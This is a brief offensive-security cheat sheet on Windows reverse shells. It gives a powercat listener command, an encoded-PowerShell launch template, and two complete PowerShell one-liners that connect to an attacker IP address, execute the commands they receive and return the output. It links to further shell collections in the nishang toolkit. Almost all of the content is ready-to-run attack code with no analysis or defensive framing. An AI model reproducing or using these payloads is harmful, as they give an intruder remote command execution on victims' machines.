# Reverse Shell

```
powercat -l -v -p 4444 -t 1000
```

```
powershell -e "<encoded-payload>"
```

Payload:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Shortened Payload:
```
#$sm=(New-Object Net.Sockets.TCPClient("192.168.254.1",55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

> http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

# TCP / UDP / WMI Shells: 
> https://github.com/samratashok/nishang/tree/master/Shells
